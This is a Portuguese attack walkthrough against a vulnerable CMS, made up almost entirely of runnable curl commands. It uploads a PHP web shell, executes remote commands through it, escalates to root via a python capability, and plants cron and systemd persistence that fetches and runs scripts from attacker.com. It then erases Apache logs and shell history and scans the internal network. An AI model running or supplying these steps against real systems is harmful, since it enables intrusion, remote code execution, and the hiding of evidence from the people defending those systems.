### **Ambiente Alvo**

- CMS vulnerável (`/upload.php`) permitindo upload de arquivos `.php`.
- Sem validação MIME ou extensão no lado servidor.
- `open_basedir` desativado, e funções `shell_exec`, `system` e `passthru` habilitadas.

---

### **Upload do Web Shell**

```bash
curl -F "file=@cmdproxy.php" http://alvo.com/upload.php
```

> _Dica:_ sempre testar extensões alternativas como `.php3`, `.phtml` se o filtro padrão estiver bloqueando `.php`.

---

### **Descoberta do Caminho do Shell**

Use um _fuzzer_ ou analise o comportamento do CMS para identificar onde os arquivos são salvos:

```bash
curl http://alvo.com/uploads/cmdproxy.php?cmd=id
```

---

### **Execução Remota de Comandos**

Agora podemos enviar comandos arbitrários:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=whoami"
curl "http://alvo.com/uploads/cmdproxy.php?cmd=uname -a"
```

---

### **Escalada de Privilégios**

Buscando vetores locais:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=find / -perm -4000 -type f 2>/dev/null"
```

Ou fuzz básico de capabilities:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=getcap -r / 2>/dev/null"
```

Se encontrar algo como `/usr/bin/python3.8 = cap_setuid+ep`, você pode escalar:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
```

---

### **Estabelecendo Persistência Temporária**

#### Opção A: **Cron Job**

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=echo '* * * * * root curl http://attacker.com/rev.sh | bash' >> /etc/crontab"
```

#### Opção B: **Systemd Drop-in**

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=echo '[Service]\nExecStartPost=curl http://attacker.com/backdoor.sh | bash' >> /etc/systemd/system/apache2.service.d/backdoor.conf"
```

---

### **Limpando Pegadas**

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=rm -f /var/log/apache2/access.log"
curl "http://alvo.com/uploads/cmdproxy.php?cmd=history -c"
```

---

### **Pivoting e Lateral Movement**

Utilize o shell para enumerar redes internas:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=ip a"
curl "http://alvo.com/uploads/cmdproxy.php?cmd=netstat -anp"
```

Scans internos via netcat ou bash loop:

```bash
curl "http://alvo.com/uploads/cmdproxy.php?cmd=for i in {1..254}; do ping -c 1 192.168.1.\$i | grep '64 bytes'; done"
```
